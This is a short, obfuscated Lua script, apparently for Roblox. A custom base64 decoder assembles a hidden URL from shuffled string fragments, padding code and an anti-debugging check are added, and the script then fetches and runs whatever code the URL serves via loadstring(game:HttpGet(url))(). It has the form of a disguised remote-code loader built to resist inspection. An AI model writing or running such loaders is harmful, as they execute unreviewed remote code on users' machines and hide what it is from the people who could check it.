local _0x = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210-+"
local _1x = {}
for _2x = 1, #_0x do
    _1x[_0x:sub(_2x, _2x)] = _2x - 1
end

local _p = {
    [3] = "oB0Dbcm9",
    [1] = "Zsi9Xsn3",
    [5] = "oAy7ZvC5",
    [2] = "adqKYR4Q",
    [6] = "jMeD",
    [4] = "Y79EXNu6"
}
local _o = {1, 3, 2, 4, 5, 6}

local _enc = ""
for _i = 1, #_o do
    _enc = _enc .. _p[_o[_i]]
end

local _dec = {}
for _i = 1, #_enc, 4 do
    local a = _1x[_enc:sub(_i, _i)]
    local b = _1x[_enc:sub(_i + 1, _i + 1)]
    local c = _1x[_enc:sub(_i + 2, _i + 2)]
    local d = _1x[_enc:sub(_i + 3, _i + 3)]
    local n = a * 262144 + b * 4096 + c * 64 + d
    _dec[#_dec + 1] = string.char(math.floor(n / 65536) % 256)
    _dec[#_dec + 1] = string.char(math.floor(n / 256) % 256)
    _dec[#_dec + 1] = string.char(n % 256)
end
local url = table.concat(_dec)

local junk = 42
for _ = 1, 10 do
    junk = junk + 1
end
if junk > 50 then
    junk = junk * 2
else
    junk = 0
end

if type(debug) == "table" and type(debug.getinfo) == "function" then
    error("Runtime error: invalid operation")
end

loadstring(game:HttpGet(url))()
